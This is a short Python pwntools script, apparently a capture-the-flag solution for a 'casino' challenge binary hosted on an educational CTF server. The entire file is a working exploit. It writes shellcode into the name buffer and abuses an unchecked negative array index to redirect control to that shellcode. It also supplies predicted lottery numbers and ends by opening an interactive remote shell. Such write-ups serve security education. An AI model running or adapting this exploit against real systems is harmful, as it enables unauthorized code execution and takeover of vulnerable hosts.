#!/usr/bin/env python
from pwn import *
import numpy as np

context.arch = 'amd64'

guess = [0x34, 0x3b, 0x3b, 0x07, 0x3f, 0x2d]

sh = asm(shellcraft.amd64.sh())
offset = int((0x6020d0 - 0x602020)/ 4)
offset_name = 0x602120 - 0x6020f0

# r = process('./casino')
r = remote('edu-ctf.csie.org', 10172)
# r = remote('127.0.0.1', 8888)
# pause()

r.sendlineafter("Your name:", b'a' * offset_name + sh)
r.sendlineafter("Your age:", '22')

for i in range(6):
    r.sendlineafter("Chose the number", "87")

r.sendlineafter("Change the number?", '1')
r.sendlineafter("Which number", str(-offset + 1))
r.sendlineafter("Chose the number", str(0x602120))

for i in range(6):
    r.sendlineafter("Chose the number", str(guess[i]))

r.sendlineafter("Change the number?", '1')
r.sendlineafter("Which number", str(-offset + 1 + 1))
r.sendlineafter("Chose the number", str(0))

r.interactive()



